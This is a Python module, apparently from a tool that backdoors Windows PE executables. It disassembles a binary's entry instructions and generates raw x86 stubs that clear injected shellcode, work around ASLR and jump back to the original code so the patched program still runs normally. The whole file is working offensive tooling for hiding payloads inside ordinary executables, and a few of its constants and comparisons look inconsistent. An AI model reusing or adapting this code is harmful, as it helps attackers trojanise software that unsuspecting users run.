from capstone import *
import struct
import random
import logging
import os
from pe.core import intelCore
logger = logging.getLogger(__name__)


class jmp_core():

    def __init__(self, BDF=None):
        self.BDF = BDF    
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "jmp_core"
        self.description = """Supports JMP opcode patching"""
        self.requirements = {}
        self.intelCore = intelCore.intelCore()

    def clean_caves_stub(self, CavesToFix):
        stub = (b"\x33\xC0"                          # XOR EAX,EAX
                b"\x31\xc9"                          # XOR ECX, ECX <- requirment for win10
                b"\x64\x8B\x49\x30"                  # mov ecx, dword ptr fs: [ecx + 0x30]
                b"\x8B\x49\x08"                      # mov ecx, dword ptr [ecx+8]
                b"\x8B\xD9"                          # mov ebx,ecx
                )
        for cave, values in CavesToFix.items():
            stub += b"\xbf"                          # mov edi, value below
            stub += struct.pack("<I", values[0])
            stub += b"\x03\xfb"                      # add edi, ebx
            stub += b"\xb9"                          # mov ecx, value below
            stub += struct.pack("<I", values[1])
            stub += b"\xf3\xaa"                      # REP STOS BYTE PTR ES:[EDI]
        return stub

    # was called pe32_entry_instr
    def entry_instr(self):
        """
        Updated to use Capstone-Engine
        """
        self.BDF.pe_object['loaded_binary'].seek(0)
                                          
        self.BDF.pe_object['loaded_binary'].seek(self.BDF.pe_object['LocOfEntryinCode'],0)
        self.count = 0
        self.BDF.pe_object['ImpList'] = []
        
        md = Cs(CS_ARCH_X86, CS_MODE_32)
        self.count = 0
        
        for k in md.disasm(self.BDF.pe_object['loaded_binary'].read(20), self.BDF.pe_object['VrtStrtngPnt']):
            self.count += k.size
            
            _bytes = bytearray(b'')

            if len(k.bytes) < k.size:
                _bytes = bytearray(b"\x00" * (k.size - len(k.bytes)))

            value_bytes = k.bytes + _bytes
            logger.debug(f'value_bytes {value_bytes}')
            self.BDF.pe_object['ImpList'].append([int(hex(k.address).strip('L'), 16),
                                          k.mnemonic.encode("utf-8"),
                                          k.op_str.encode("utf-8"),
                                          int(hex(k.address).strip('L'), 16) + k.size,
                                          value_bytes,
                                          k.size])

            if self.count >= 6 or self.count % 5 == 0 and self.count != 0:
                break
        logger.debug(f"self.BDF.pe_object[ImpList] {self.BDF.pe_object['ImpList']}")
        self.BDF.pe_object['count_bytes'] = self.count
        self.BDF.pe_object['loaded_binary'].seek(0)

    #was resume_execution_32
    def resume_execution_jmp(self):
        """
        This section of code imports the self.BDF.pe_object['ImpList'] from pe32_entry_instr
        to patch the executable after shellcode execution
        """

        logger.info("[*] Creating win32 resume execution stub")
        resumeExe = b''
        # buffer for zeroing shellcode (no performance impact)
        resumeExe += b"\x51"             # push ecx
        resumeExe += b"\xb9"             # mov ecx, value below
        resumeExe += struct.pack("<I", (len(self.BDF.pe_object['shellcode']) - 6))
        resumeExe += b"\xe2\xfe"         # loop back on itself
        resumeExe += b"\x59"             # pop ecx
        
        for item in self.BDF.pe_object['ImpList']:
            startingPoint = item[0]
            OpCode = item[1]
            CallValue = item[2]
            ReturnTrackingAddress = item[3]
            entireInstr = item[4]
            self.intelCore.ones_compliment(TESTING=self.BDF.TESTING)
            if OpCode == b'call':  # Call instruction
                # Let's beat ASLR :D
                CallValue = int(CallValue, 16)
                resumeExe += b"\xb8"
                if self.BDF.pe_object['LastCaveAddress'] == 0:
                    self.BDF.pe_object['LastCaveAddress'] = self.BDF.pe_object['JMPtoCodeAddress']
                #Could make this more exact...
                aprox_loc_wo_alsr = (startingPoint +
                                     self.BDF.pe_object['LastCaveAddress'] +
                                     len(self.BDF.pe_object['shellcode']) + len(resumeExe) +
                                     500 + self.BDF.pe_object['buffer'])
                logger.info(f'aprox_loc_wo_alsr:{aprox_loc_wo_alsr}')
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += b"\x00" * 4
                # POP ECX to find location
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += b"\x2b\xc1"  # sub eax,ecx
                resumeExe += b"\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += b"\x77\x12"  # JA (14)
                resumeExe += b"\x83\xC1\x15"  # ADD ECX, 15
                resumeExe += b"\x51"
                resumeExe += b"\xb8"  # Mov EAX ..
                if CallValue > 4294967295:
                    resumeExe += struct.pack('<I', CallValue - 0xffffffff - 1)
                else:
                    resumeExe += struct.pack('<I', CallValue)
                resumeExe += b"\xff\xe0"  # JMP EAX
                resumeExe += b"\xb8"  # ADD
                resumeExe += struct.pack('<I', item[3])
                resumeExe += b"\x50\xc3"  # PUSH EAX,RETN
                resumeExe += b"\x8b\xf0"
                resumeExe += b"\x8b\xc2"
                resumeExe += b"\xb9"
                resumeExe += struct.pack("<I", startingPoint)
                resumeExe += b"\x2b\xc1"
                resumeExe += b"\x05"
                resumeExe += struct.pack('<I', ReturnTrackingAddress)
                resumeExe += b"\x50"
                resumeExe += b"\x05"
                resumeExe += entireInstr[1:]
                resumeExe += b"\x50"
                resumeExe += b"\x33\xc9"
                resumeExe += b"\x8b\xc6"
                resumeExe += b"\x81\xe6"
                resumeExe += self.intelCore.compliment_you
                resumeExe += b"\x81\xe6"
                resumeExe += self.intelCore.compliment_me
                resumeExe += b"\xc3"
                return ReturnTrackingAddress, resumeExe

            elif any(symbol in OpCode for symbol in self.intelCore.jmp_symbols):
                #Let's beat ASLR
                CallValue = int(CallValue, 16)
                resumeExe += b"\xb8"
                aprox_loc_wo_alsr = (startingPoint +
                                     self.BDF.pe_object['LastCaveAddress'] +
                                     len(self.BDF.pe_object['shellcode']) + len(resumeExe) +
                                     200 + self.BDF.pe_object['buffer'])
                resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
                resumeExe += struct.pack('=B', int('E8', 16))  # call
                resumeExe += b"\x00" * 4
                resumeExe += struct.pack('=B', int('59', 16))
                resumeExe += b"\x2b\xc1"  # sub eax,ecx
                resumeExe += b"\x3d\x00\x05\x00\x00"  # cmp eax,500
                resumeExe += b"\x77\x0b"  # JA (14)
                resumeExe += b"\x83\xC1\x16"
                resumeExe += b"\x51"
                resumeExe += b"\xb8"  # Mov EAX ..

                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue + 5)  # Add+ EAX,CallV
                resumeExe += b"\x50\xc3"
                resumeExe += b"\x8b\xf0"
                resumeExe += b"\x8b\xc2"
                resumeExe += b"\xb9"
                resumeExe += struct.pack('<I', startingPoint - 5)
                resumeExe += b"\x2b\xc1"
                resumeExe += b"\x05"
                if OpCode is int('ea', 16):  # jmp far
                    resumeExe += struct.pack('<BBBBBB', CallValue + 5)
                elif CallValue > 429467295:
                    resumeExe += struct.pack('<I', abs(CallValue + 5 - 0xffffffff + 2))
                else:
                    resumeExe += struct.pack('<I', CallValue + 5 - 2)
                resumeExe += b"\x50"
                resumeExe += b"\x33\xc9"
                resumeExe += b"\x8b\xc6"
                resumeExe += b"\x81\xe6"
                resumeExe += self.intelCore.compliment_you
                resumeExe += b"\x81\xe6"
                resumeExe += self.intelCore.compliment_me
                resumeExe += b"\xc3"
                return ReturnTrackingAddress, resumeExe
            else:
                resumeExe += entireInstr

        resumeExe += b"\x25"
        resumeExe += self.intelCore.compliment_you  # zero out EAX
        resumeExe += b"\x25"
        resumeExe += self.intelCore.compliment_me  # zero out EAX
        resumeExe += b"\x05"  # ADD
        resumeExe += struct.pack('<I', ReturnTrackingAddress)
        resumeExe += b"\x50"  # push eax
        resumeExe += b"\x25"  # zero out EAX
        resumeExe += self.intelCore.compliment_you
        resumeExe += b"\x25"  # zero out EAX
        resumeExe += self.intelCore.compliment_me
        resumeExe += b"\xC3"

        return ReturnTrackingAddress, resumeExe
